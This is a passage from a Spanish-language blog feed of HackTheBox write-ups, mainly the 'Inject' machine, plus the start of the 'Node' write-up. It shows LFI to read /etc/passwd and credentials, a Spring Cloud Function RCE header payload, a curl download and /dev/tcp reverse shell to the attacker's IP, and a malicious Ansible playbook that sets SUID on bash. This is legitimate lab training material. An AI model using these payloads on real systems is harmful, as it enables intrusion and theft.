|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 8.2p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8080&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;nagios-nsca Nagios NSCA&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos usando &lt;code&gt;whatweb&lt;/code&gt;, para determinar las tecnologias que esta usando el servicio web.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.11.204:8080
http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que existe una sección de login y registro pero que esta actualmente en construcción.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En la pagina principal tambien podemos ver una sección de &lt;code&gt;upload&lt;/code&gt;, la cual nos redirige a una ruta de subida de archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a tratar de subir un archivo simple con extensión &lt;code&gt;txt&lt;/code&gt; y vamos a interceptar la petición con &lt;code&gt;burpsuite&lt;/code&gt; para realizar pruebas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interceptamos la petición y la mandamos al &lt;code&gt;Repeater&lt;/code&gt;, y vemos como respuesta que solo podemos subir imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un &lt;code&gt;LFI&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=..&quot;
java
resources
uploads
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos listar los usuarios de el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd&quot; | grep &quot;sh$&quot;
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo &lt;code&gt;settings.xml&lt;/code&gt; en el directorio del usuario &lt;code&gt;frank&lt;/code&gt;. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario &lt;code&gt;phill&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2&quot;
settings.xml
❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml&quot; -o settings.xml
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat settings.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
  &amp;lt;servers&amp;gt;
    &amp;lt;server&amp;gt;
      &amp;lt;id&amp;gt;Inject&amp;lt;/id&amp;gt;
      &amp;lt;username&amp;gt;phil&amp;lt;/username&amp;gt;
      &amp;lt;password&amp;gt;DocPhillovestoInject123&amp;lt;/password&amp;gt;
      &amp;lt;privateKey&amp;gt;${user.home}/.ssh/id_dsa&amp;lt;/privateKey&amp;gt;
      &amp;lt;filePermissions&amp;gt;660&amp;lt;/filePermissions&amp;gt;
      &amp;lt;directoryPermissions&amp;gt;660&amp;lt;/directoryPermissions&amp;gt;
      &amp;lt;configuration&amp;gt;&amp;lt;/configuration&amp;gt;
    &amp;lt;/server&amp;gt;
  &amp;lt;/servers&amp;gt;
&amp;lt;/settings&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de contectarnos por el servicio &lt;code&gt;ssh&lt;/code&gt;, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo &lt;code&gt;pom.xml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X GET &quot;http://10.10.11.204:8080/show_image?img=../../../&quot;
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si vemos el contenido vemos que esta relacionado a &lt;code&gt;spring framework&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;❯ cat pom.xml
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
	xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&amp;gt;
	&amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;
	&amp;lt;parent&amp;gt;
		&amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
		&amp;lt;artifactId&amp;gt;spring-boot-starter-parent&amp;lt;/artifactId&amp;gt;
		&amp;lt;version&amp;gt;2.6.5&amp;lt;/version&amp;gt;
		&amp;lt;relativePath/&amp;gt; &amp;lt;!-- lookup parent from repository --&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si buscamos un poco encontramos un exploit que nos otorga &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&quot;&gt;https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si abrimos el explit, observamos que este se aprovecha de una ruta &lt;code&gt;functionRouter&lt;/code&gt; y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Inject/inj7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio &lt;code&gt;curl&lt;/code&gt;. Nos mandamos una traza a nuestra maquina host.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;ping -c 1 10.10.16.2&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:56:07.739+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y recibimos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:56:22.791783 IP 10.10.11.204 &amp;gt; 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
18:56:22.791819 IP 10.10.16.2 &amp;gt; 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ganar acceso vamos a crearnos un archivo en bash de nombre &lt;code&gt;index.html&lt;/code&gt; que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat index.html
#!/bin/bash

bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.2/443 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Realizamos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl 10.10.16.2 -o /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T18:58:54.291+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petición en nuestro servicio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [19/Jul/2023 18:59:09] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos ejecutarlo y ponermos en escucha con &lt;code&gt;ntcat&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ curl -s -X POST &quot;http://10.10.11.204:8080/functionRouter&quot; -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/reverse&quot;)' -d '.'
{&quot;timestamp&quot;:&quot;2023-07-19T19:05:11.598+00:00&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String&quot;,&quot;path&quot;:&quot;/functionRouter&quot;}#                        
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Obtenemos acceso como el usuario &lt;code&gt;frank&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.204.
Ncat: Connection from 10.10.11.204:60530.
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como siempre hacemos el tratamiento para obtener una full &lt;code&gt;tty&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
frank@inject:/$ export TERM=xterm
frank@inject:/$ export SHELL=bash
frank@inject:/$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ find / -name user.txt 2&amp;gt;/dev/null
/home/phil/user.txt
^C
frank@inject:/$ cat /home/phil/user.txt
cat: /home/phil/user.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recordemos que antes obtuvimos unas credenciales del usuario &lt;code&gt;phil&lt;/code&gt;, asi que vamos a tratar de usar esa contraseña y migrar al usuario &lt;code&gt;phil&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;frank@inject:/$ su phil
Password: 
phil@inject:/$ whoami
phil
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/$ cd /home/phil/
phil@inject:~$ cat user.txt 
7b309ae956b0821aef61ef39aa5d4f7e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ya que somos el usuario &lt;code&gt;phil&lt;/code&gt;, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a &lt;code&gt;staff&lt;/code&gt;. Seguidamente listamos los recuros a los que tenemos acceso.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ find / -group staff 2&amp;gt;/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
phil@inject:~$ /opt/automation/tasks
bash: /opt/automation/tasks: Is a directory
phil@inject:~$ ls -l /opt/automation/tasks
total 4
-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Observamos un &lt;code&gt;playbook.yml&lt;/code&gt;, si investigamos un poco encotramos que esta relacionado a ansible.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ cat procmon.sh
#!/bin/bash

old_process=$(ps -eo user, command)

while true; do
	new_process=$(ps -eo user, command)
	diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;procmon|kworker|command&quot;
	old_process=$new_process
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script y obervamos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un borrado de todo lo que se encuentra en el directorio &lt;code&gt;tasks&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/tmp$ ./procmon.sh 
&amp;lt; root     /usr/sbin/CRON -f
&amp;lt; root     /bin/sh -c sleep 10 &amp;amp;&amp;amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;amp;&amp;amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
&amp;lt; root     sleep 10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que podemos hacer es crearnos un archivo similar a &lt;code&gt;playbook_1.yml&lt;/code&gt; para insertar un comando y al ejecutar la tarea el usuario &lt;code&gt;root&lt;/code&gt;, podemos tratar de cambiar los permisos de la &lt;code&gt;bash&lt;/code&gt; otorgandole &lt;code&gt;suid&lt;/code&gt; y asi poder convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello primero debemos crearnos un archivo &lt;code&gt;reverse.yml&lt;/code&gt; malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&quot;&gt;https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ cat reverse.yml 
- hosts: localhost
  tasks:
  - name: suid to bash
    ansible.builtin.shell: chmod u+s /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la &lt;code&gt;bash&lt;/code&gt; ahora cuenta con el privilegio &lt;code&gt;suid&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda ahora es convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
26521e5fb779f8e62fa4d068175a3b5a
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Wed, 19 Jul 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Inject</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Inject</guid>
        
        <category>Web Enumeation</category>
        
        <category>Local File Inclusion</category>
        
        <category>Information Leaked</category>
        
        <category>Spring CLoud Explotation</category>
        
        <category>Abusing Cron Job</category>
        
        <category>Malicius Ansible Playbook</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Node - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Node&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, para poder comprometer la maquina nos aprovecharemos la informacion lekeada del servicio expuesta en la &lt;code&gt;api&lt;/code&gt; que nos otorgara credenciales para conectarnos al servicio, donde descargaremos un backup comprimido con información para poder ingresar al sistema, despues aprovecharemos de una inyeccion a una task de &lt;code&gt;mongodb&lt;/code&gt; donde a traves de un campo obtendremos ejecución remota de comandos &lt;code&gt;rce&lt;/code&gt; y finalmente mediante un binario &lt;code&gt;suid&lt;/code&gt; podremos leeer la flag del usuario &lt;code&gt;root&lt;/code&gt;. Ademas alternivamente vamos a ganar acceso al sistema explotando un &lt;code&gt;buffer overflow&lt;/code&gt; en el binario &lt;code&gt;suid&lt;/code&gt; a traves de &lt;code&gt;ret2libc&lt;/code&gt; y ganando acceso al sistema como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Node
❯ ls:w

 Node
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.58
PING 10.10.10.58 (10.10.10.58) 56(84) bytes of data.
64 bytes from 10.10.10.58: icmp_seq=1 ttl=63 time=109 ms

--- 10.10.10.58 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.550/108.550/108.550/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.58 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:25 GMT
Initiating SYN Stealth Scan at 22:25
Scanning 10.10.10.58 [65535 ports]
Discovered open port 22/tcp on 10.10.10.58
Discovered open port 3000/tcp on 10.10.10.58
Completed SYN Stealth Scan at 22:25, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.58
Host is up, received user-set (0.11s latency).
Scanned at 2023-07-17 22:25:27 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,3000 10.10.10.58 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-17 22:26 GMT
Nmap scan report for 10.10.10.58
Host is up (0.12s latency).

PORT     STATE SERVICE            VERSION
22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.44 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.2p2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;hadoop-tasktracker&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
